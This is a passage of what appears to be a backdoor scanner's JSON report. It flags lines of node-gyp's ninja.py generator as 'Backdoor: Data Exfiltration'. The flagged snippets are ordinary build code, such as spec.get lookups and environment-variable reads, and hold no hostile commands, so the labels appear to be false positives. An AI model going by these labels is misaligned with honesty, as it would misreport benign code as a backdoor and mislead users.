                    "text": "        representing the outputs of these steps.\"\"\"\n        outputs = []\n        if self.is_mac_bundle:\n            mac_bundle_resources = spec.get(\"mac_bundle_resources\", [])[:]\n        else:\n            mac_bundle_resources = []\n        extra_mac_bundle_resources = []\n",
                    "rendered": {
                      "text": "        representing the outputs of these steps.\"\"\"\n        outputs = []\n        if self.is_mac_bundle:\n            mac_bundle_resources = spec.get(\"mac_bundle_resources\", [])[:]\n        else:\n            mac_bundle_resources = []\n        extra_mac_bundle_resources = []\n",
                      "markdown": "`        representing the outputs of these steps.\"\"\"\n        outputs = []\n        if self.is_mac_bundle:\n            mac_bundle_resources = spec.get(\"mac_bundle_resources\", [])[:]\n        else:\n            mac_bundle_resources = []\n        extra_mac_bundle_resources = []\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 479,
                  "startColumn": 51,
                  "endLine": 479,
                  "endColumn": 56,
                  "snippet": {
                    "text": "            sources = extra_sources + spec.get(\"sources\", [])\n        except TypeError:\n            print(\"extra_sources: \", str(extra_sources))\n            print('spec.get(\"sources\"): ', str(spec.get(\"sources\")))\n            raise\n        if sources:\n            if self.flavor == \"mac\" and len(self.archs) > 1:\n",
                    "rendered": {
                      "text": "            sources = extra_sources + spec.get(\"sources\", [])\n        except TypeError:\n            print(\"extra_sources: \", str(extra_sources))\n            print('spec.get(\"sources\"): ', str(spec.get(\"sources\")))\n            raise\n        if sources:\n            if self.flavor == \"mac\" and len(self.archs) > 1:\n",
                      "markdown": "`            sources = extra_sources + spec.get(\"sources\", [])\n        except TypeError:\n            print(\"extra_sources: \", str(extra_sources))\n            print('spec.get(\"sources\"): ', str(spec.get(\"sources\")))\n            raise\n        if sources:\n            if self.flavor == \"mac\" and len(self.archs) > 1:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 479,
                  "startColumn": 23,
                  "endLine": 479,
                  "endColumn": 28,
                  "snippet": {
                    "text": "            sources = extra_sources + spec.get(\"sources\", [])\n        except TypeError:\n            print(\"extra_sources: \", str(extra_sources))\n            print('spec.get(\"sources\"): ', str(spec.get(\"sources\")))\n            raise\n        if sources:\n            if self.flavor == \"mac\" and len(self.archs) > 1:\n",
                    "rendered": {
                      "text": "            sources = extra_sources + spec.get(\"sources\", [])\n        except TypeError:\n            print(\"extra_sources: \", str(extra_sources))\n            print('spec.get(\"sources\"): ', str(spec.get(\"sources\")))\n            raise\n        if sources:\n            if self.flavor == \"mac\" and len(self.archs) > 1:\n",
                      "markdown": "`            sources = extra_sources + spec.get(\"sources\", [])\n        except TypeError:\n            print(\"extra_sources: \", str(extra_sources))\n            print('spec.get(\"sources\"): ', str(spec.get(\"sources\")))\n            raise\n        if sources:\n            if self.flavor == \"mac\" and len(self.archs) > 1:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 476,
                  "startColumn": 42,
                  "endLine": 476,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        # Write out the compilation steps, if any.\n        link_deps = []\n        try:\n            sources = extra_sources + spec.get(\"sources\", [])\n        except TypeError:\n            print(\"extra_sources: \", str(extra_sources))\n            print('spec.get(\"sources\"): ', str(spec.get(\"sources\")))\n",
                    "rendered": {
                      "text": "        # Write out the compilation steps, if any.\n        link_deps = []\n        try:\n            sources = extra_sources + spec.get(\"sources\", [])\n        except TypeError:\n            print(\"extra_sources: \", str(extra_sources))\n            print('spec.get(\"sources\"): ', str(spec.get(\"sources\")))\n",
                      "markdown": "`        # Write out the compilation steps, if any.\n        link_deps = []\n        try:\n            sources = extra_sources + spec.get(\"sources\", [])\n        except TypeError:\n            print(\"extra_sources: \", str(extra_sources))\n            print('spec.get(\"sources\"): ', str(spec.get(\"sources\")))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 401,
                  "startColumn": 47,
                  "endLine": 401,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        self.xcode_settings = self.msvs_settings = None\n        if self.flavor == \"mac\":\n            self.xcode_settings = gyp.xcode_emulation.XcodeSettings(spec)\n            mac_toolchain_dir = generator_flags.get(\"mac_toolchain_dir\", None)\n            if mac_toolchain_dir:\n                self.xcode_settings.mac_toolchain_dir = mac_toolchain_dir\n\n",
                    "rendered": {
                      "text": "        self.xcode_settings = self.msvs_settings = None\n        if self.flavor == \"mac\":\n            self.xcode_settings = gyp.xcode_emulation.XcodeSettings(spec)\n            mac_toolchain_dir = generator_flags.get(\"mac_toolchain_dir\", None)\n            if mac_toolchain_dir:\n                self.xcode_settings.mac_toolchain_dir = mac_toolchain_dir\n\n",
                      "markdown": "`        self.xcode_settings = self.msvs_settings = None\n        if self.flavor == \"mac\":\n            self.xcode_settings = gyp.xcode_emulation.XcodeSettings(spec)\n            mac_toolchain_dir = generator_flags.get(\"mac_toolchain_dir\", None)\n            if mac_toolchain_dir:\n                self.xcode_settings.mac_toolchain_dir = mac_toolchain_dir\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 395,
                  "startColumn": 43,
                  "endLine": 395,
                  "endColumn": 48,
                  "snippet": {
                    "text": "            spec.get(\"standalone_static_library\", 0)\n        )\n\n        self.target_rpath = generator_flags.get(\"target_rpath\", r\"\\$$ORIGIN/lib/\")\n\n        self.is_mac_bundle = gyp.xcode_emulation.IsMacBundle(self.flavor, spec)\n        self.xcode_settings = self.msvs_settings = None\n",
                    "rendered": {
                      "text": "            spec.get(\"standalone_static_library\", 0)\n        )\n\n        self.target_rpath = generator_flags.get(\"target_rpath\", r\"\\$$ORIGIN/lib/\")\n\n        self.is_mac_bundle = gyp.xcode_emulation.IsMacBundle(self.flavor, spec)\n        self.xcode_settings = self.msvs_settings = None\n",
                      "markdown": "`            spec.get(\"standalone_static_library\", 0)\n        )\n\n        self.target_rpath = generator_flags.get(\"target_rpath\", r\"\\$$ORIGIN/lib/\")\n\n        self.is_mac_bundle = gyp.xcode_emulation.IsMacBundle(self.flavor, spec)\n        self.xcode_settings = self.msvs_settings = None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 392,
                  "startColumn": 16,
                  "endLine": 392,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        config = spec[\"configurations\"][config_name]\n        self.target = Target(spec[\"type\"])\n        self.is_standalone_static_library = bool(\n            spec.get(\"standalone_static_library\", 0)\n        )\n\n        self.target_rpath = generator_flags.get(\"target_rpath\", r\"\\$$ORIGIN/lib/\")\n",
                    "rendered": {
                      "text": "        config = spec[\"configurations\"][config_name]\n        self.target = Target(spec[\"type\"])\n        self.is_standalone_static_library = bool(\n            spec.get(\"standalone_static_library\", 0)\n        )\n\n        self.target_rpath = generator_flags.get(\"target_rpath\", r\"\\$$ORIGIN/lib/\")\n",
                      "markdown": "`        config = spec[\"configurations\"][config_name]\n        self.target = Target(spec[\"type\"])\n        self.is_standalone_static_library = bool(\n            spec.get(\"standalone_static_library\", 0)\n        )\n\n        self.target_rpath = generator_flags.get(\"target_rpath\", r\"\\$$ORIGIN/lib/\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2361,
                  "startColumn": 30,
                  "endLine": 2361,
                  "endColumn": 62,
                  "snippet": {
                    "text": "            # the master ninja with extra unused variables.\n            master_ninja.variable(\"nm\", GetEnvironFallback([\"NM_target\", \"NM\"], nm))\n            master_ninja.variable(\n                \"readelf\", GetEnvironFallback([\"READELF_target\", \"READELF\"], readelf)\n            )\n\n    if generator_supports_multiple_toolsets:\n",
                    "rendered": {
                      "text": "            # the master ninja with extra unused variables.\n            master_ninja.variable(\"nm\", GetEnvironFallback([\"NM_target\", \"NM\"], nm))\n            master_ninja.variable(\n                \"readelf\", GetEnvironFallback([\"READELF_target\", \"READELF\"], readelf)\n            )\n\n    if generator_supports_multiple_toolsets:\n",
                      "markdown": "`            # the master ninja with extra unused variables.\n            master_ninja.variable(\"nm\", GetEnvironFallback([\"NM_target\", \"NM\"], nm))\n            master_ninja.variable(\n                \"readelf\", GetEnvironFallback([\"READELF_target\", \"READELF\"], readelf)\n            )\n\n    if generator_supports_multiple_toolsets:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2359,
                  "startColumn": 43,
                  "endLine": 2359,
                  "endColumn": 70,
                  "snippet": {
                    "text": "        if flavor != \"mac\":\n            # Mac does not use readelf/nm for .TOC generation, so avoiding polluting\n            # the master ninja with extra unused variables.\n            master_ninja.variable(\"nm\", GetEnvironFallback([\"NM_target\", \"NM\"], nm))\n            master_ninja.variable(\n                \"readelf\", GetEnvironFallback([\"READELF_target\", \"READELF\"], readelf)\n            )\n",
                    "rendered": {
                      "text": "        if flavor != \"mac\":\n            # Mac does not use readelf/nm for .TOC generation, so avoiding polluting\n            # the master ninja with extra unused variables.\n            master_ninja.variable(\"nm\", GetEnvironFallback([\"NM_target\", \"NM\"], nm))\n            master_ninja.variable(\n                \"readelf\", GetEnvironFallback([\"READELF_target\", \"READELF\"], readelf)\n            )\n",
                      "markdown": "`        if flavor != \"mac\":\n            # Mac does not use readelf/nm for .TOC generation, so avoiding polluting\n            # the master ninja with extra unused variables.\n            master_ninja.variable(\"nm\", GetEnvironFallback([\"NM_target\", \"NM\"], nm))\n            master_ninja.variable(\n                \"readelf\", GetEnvironFallback([\"READELF_target\", \"READELF\"], readelf)\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2355,
                  "startColumn": 39,
                  "endLine": 2355,
                  "endColumn": 66,
                  "snippet": {
                    "text": "    else:\n        master_ninja.variable(\"ld\", CommandWithWrapper(\"LINK\", wrappers, ld))\n        master_ninja.variable(\"ldxx\", CommandWithWrapper(\"LINK\", wrappers, ldxx))\n        master_ninja.variable(\"ar\", GetEnvironFallback([\"AR_target\", \"AR\"], ar))\n        if flavor != \"mac\":\n            # Mac does not use readelf/nm for .TOC generation, so avoiding polluting\n            # the master ninja with extra unused variables.\n",
                    "rendered": {
                      "text": "    else:\n        master_ninja.variable(\"ld\", CommandWithWrapper(\"LINK\", wrappers, ld))\n        master_ninja.variable(\"ldxx\", CommandWithWrapper(\"LINK\", wrappers, ldxx))\n        master_ninja.variable(\"ar\", GetEnvironFallback([\"AR_target\", \"AR\"], ar))\n        if flavor != \"mac\":\n            # Mac does not use readelf/nm for .TOC generation, so avoiding polluting\n            # the master ninja with extra unused variables.\n",
                      "markdown": "`    else:\n        master_ninja.variable(\"ld\", CommandWithWrapper(\"LINK\", wrappers, ld))\n        master_ninja.variable(\"ldxx\", CommandWithWrapper(\"LINK\", wrappers, ldxx))\n        master_ninja.variable(\"ar\", GetEnvironFallback([\"AR_target\", \"AR\"], ar))\n        if flavor != \"mac\":\n            # Mac does not use readelf/nm for .TOC generation, so avoiding polluting\n            # the master ninja with extra unused variables.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2341,
                  "startColumn": 13,
                  "endLine": 2341,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n    cc = GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    master_ninja.variable(\"cc\", CommandWithWrapper(\"CC\", wrappers, cc))\n    cxx = GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n    master_ninja.variable(\"cxx\", CommandWithWrapper(\"CXX\", wrappers, cxx))\n\n    if flavor == \"win\":\n",
                    "rendered": {
                      "text": "\n    cc = GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    master_ninja.variable(\"cc\", CommandWithWrapper(\"CC\", wrappers, cc))\n    cxx = GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n    master_ninja.variable(\"cxx\", CommandWithWrapper(\"CXX\", wrappers, cxx))\n\n    if flavor == \"win\":\n",
                      "markdown": "`\n    cc = GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    master_ninja.variable(\"cc\", CommandWithWrapper(\"CC\", wrappers, cc))\n    cxx = GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n    master_ninja.variable(\"cxx\", CommandWithWrapper(\"CXX\", wrappers, cxx))\n\n    if flavor == \"win\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2339,
                  "startColumn": 12,
                  "endLine": 2339,
                  "endColumn": 39,
                  "snippet": {
                    "text": "                command += \" -m32\" if arch == \"x86\" else \" -m64\"\n            master_ninja.variable(\"cl_\" + arch, command)\n\n    cc = GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    master_ninja.variable(\"cc\", CommandWithWrapper(\"CC\", wrappers, cc))\n    cxx = GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n    master_ninja.variable(\"cxx\", CommandWithWrapper(\"CXX\", wrappers, cxx))\n",
                    "rendered": {
                      "text": "                command += \" -m32\" if arch == \"x86\" else \" -m64\"\n            master_ninja.variable(\"cl_\" + arch, command)\n\n    cc = GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    master_ninja.variable(\"cc\", CommandWithWrapper(\"CC\", wrappers, cc))\n    cxx = GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n    master_ninja.variable(\"cxx\", CommandWithWrapper(\"CXX\", wrappers, cxx))\n",
                      "markdown": "`                command += \" -m32\" if arch == \"x86\" else \" -m64\"\n            master_ninja.variable(\"cl_\" + arch, command)\n\n    cc = GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    master_ninja.variable(\"cc\", CommandWithWrapper(\"CC\", wrappers, cc))\n    cxx = GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n    master_ninja.variable(\"cxx\", CommandWithWrapper(\"CXX\", wrappers, cxx))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2166,
                  "startColumn": 35,
                  "endLine": 2166,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        )\n\n    rule_name_suffix = _GetWinLinkRuleNameSuffix(embed_manifest)\n    use_separate_mspdbsrv = int(os.environ.get(\"GYP_USE_SEPARATE_MSPDBSRV\", \"0\")) != 0\n    dlldesc = \"LINK%s(DLL) $binary\" % rule_name_suffix.upper()\n    dllcmd = (\n        \"%s gyp-win-tool link-wrapper $arch %s \"\n",
                    "rendered": {
                      "text": "        )\n\n    rule_name_suffix = _GetWinLinkRuleNameSuffix(embed_manifest)\n    use_separate_mspdbsrv = int(os.environ.get(\"GYP_USE_SEPARATE_MSPDBSRV\", \"0\")) != 0\n    dlldesc = \"LINK%s(DLL) $binary\" % rule_name_suffix.upper()\n    dllcmd = (\n        \"%s gyp-win-tool link-wrapper $arch %s \"\n",
                      "markdown": "`        )\n\n    rule_name_suffix = _GetWinLinkRuleNameSuffix(embed_manifest)\n    use_separate_mspdbsrv = int(os.environ.get(\"GYP_USE_SEPARATE_MSPDBSRV\", \"0\")) != 0\n    dlldesc = \"LINK%s(DLL) $binary\" % rule_name_suffix.upper()\n    dllcmd = (\n        \"%s gyp-win-tool link-wrapper $arch %s \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2115,
                  "startColumn": 33,
                  "endLine": 2115,
                  "endColumn": 65,
                  "snippet": {
                    "text": "        # VS 2015 uses 20% more working set than VS 2013 and can consume all RAM\n        # on a 64 GiB machine.\n        mem_limit = max(1, stat.ullTotalPhys // (5 * (2 ** 30)))  # total / 5GiB\n        hard_cap = max(1, int(os.environ.get(\"GYP_LINK_CONCURRENCY_MAX\", 2 ** 32)))\n        return min(mem_limit, hard_cap)\n    elif sys.platform.startswith(\"linux\"):\n        if os.path.exists(\"/proc/meminfo\"):\n",
                    "rendered": {
                      "text": "        # VS 2015 uses 20% more working set than VS 2013 and can consume all RAM\n        # on a 64 GiB machine.\n        mem_limit = max(1, stat.ullTotalPhys // (5 * (2 ** 30)))  # total / 5GiB\n        hard_cap = max(1, int(os.environ.get(\"GYP_LINK_CONCURRENCY_MAX\", 2 ** 32)))\n        return min(mem_limit, hard_cap)\n    elif sys.platform.startswith(\"linux\"):\n        if os.path.exists(\"/proc/meminfo\"):\n",
                      "markdown": "`        # VS 2015 uses 20% more working set than VS 2013 and can consume all RAM\n        # on a 64 GiB machine.\n        mem_limit = max(1, stat.ullTotalPhys // (5 * (2 ** 30)))  # total / 5GiB\n        hard_cap = max(1, int(os.environ.get(\"GYP_LINK_CONCURRENCY_MAX\", 2 ** 32)))\n        return min(mem_limit, hard_cap)\n    elif sys.platform.startswith(\"linux\"):\n        if os.path.exists(\"/proc/meminfo\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 2088,
                  "startColumn": 23,
                  "endLine": 2088,
                  "endColumn": 55,
                  "snippet": {
                    "text": "\ndef GetDefaultConcurrentLinks():\n    \"\"\"Returns a best-guess for a number of concurrent links.\"\"\"\n    pool_size = int(os.environ.get(\"GYP_LINK_CONCURRENCY\", 0))\n    if pool_size:\n        return pool_size\n\n",
                    "rendered": {
                      "text": "\ndef GetDefaultConcurrentLinks():\n    \"\"\"Returns a best-guess for a number of concurrent links.\"\"\"\n    pool_size = int(os.environ.get(\"GYP_LINK_CONCURRENCY\", 0))\n    if pool_size:\n        return pool_size\n\n",
                      "markdown": "`\ndef GetDefaultConcurrentLinks():\n    \"\"\"Returns a best-guess for a number of concurrent links.\"\"\"\n    pool_size = int(os.environ.get(\"GYP_LINK_CONCURRENCY\", 0))\n    if pool_size:\n        return pool_size\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1752,
                  "startColumn": 8,
                  "endLine": 1752,
                  "endColumn": 65,
                  "snippet": {
                    "text": "        postbuilds.insert(\n            0, gyp.common.EncodePOSIXShellList([\"cd\", self.build_to_base])\n        )\n        env = self.ComputeExportEnvString(self.GetSortedXcodePostbuildEnv())\n        # G will be non-null if any postbuild fails. Run all postbuilds in a\n        # subshell.\n        commands = (\n",
                    "rendered": {
                      "text": "        postbuilds.insert(\n            0, gyp.common.EncodePOSIXShellList([\"cd\", self.build_to_base])\n        )\n        env = self.ComputeExportEnvString(self.GetSortedXcodePostbuildEnv())\n        # G will be non-null if any postbuild fails. Run all postbuilds in a\n        # subshell.\n        commands = (\n",
                      "markdown": "`        postbuilds.insert(\n            0, gyp.common.EncodePOSIXShellList([\"cd\", self.build_to_base])\n        )\n        env = self.ComputeExportEnvString(self.GetSortedXcodePostbuildEnv())\n        # G will be non-null if any postbuild fails. Run all postbuilds in a\n        # subshell.\n        commands = (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1715,
                  "startColumn": 34,
                  "endLine": 1715,
                  "endColumn": 62,
                  "snippet": {
                    "text": "        )\n        if strip_save_file:\n            postbuild_settings[\"CHROMIUM_STRIP_SAVE_FILE\"] = strip_save_file\n        return self.GetSortedXcodeEnv(additional_settings=postbuild_settings)\n\n    def AppendPostbuildVariable(\n        self, variables, spec, output, binary, is_command_start=False\n",
                    "rendered": {
                      "text": "        )\n        if strip_save_file:\n            postbuild_settings[\"CHROMIUM_STRIP_SAVE_FILE\"] = strip_save_file\n        return self.GetSortedXcodeEnv(additional_settings=postbuild_settings)\n\n    def AppendPostbuildVariable(\n        self, variables, spec, output, binary, is_command_start=False\n",
                      "markdown": "`        )\n        if strip_save_file:\n            postbuild_settings[\"CHROMIUM_STRIP_SAVE_FILE\"] = strip_save_file\n        return self.GetSortedXcodeEnv(additional_settings=postbuild_settings)\n\n    def AppendPostbuildVariable(\n        self, variables, spec, output, binary, is_command_start=False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1684,
                  "startColumn": 12,
                  "endLine": 1684,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n\n    def GetMsvsToolchainEnv(self, additional_settings=None):\n",
                    "rendered": {
                      "text": "        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n\n    def GetMsvsToolchainEnv(self, additional_settings=None):\n",
                      "markdown": "`        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n\n    def GetMsvsToolchainEnv(self, additional_settings=None):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 1682,
                  "startColumn": 8,
                  "endLine": 1682,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n    def GetToolchainEnv(self, additional_settings=None):\n        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n",
                    "rendered": {
                      "text": "\n    def GetToolchainEnv(self, additional_settings=None):\n        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n",
                      "markdown": "`\n    def GetToolchainEnv(self, additional_settings=None):\n        \"\"\"Returns the variables toolchain would set for build steps.\"\"\"\n        env = self.GetSortedXcodeEnv(additional_settings=additional_settings)\n        if self.flavor == \"win\":\n            env = self.GetMsvsToolchainEnv(additional_settings=additional_settings)\n        return env\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
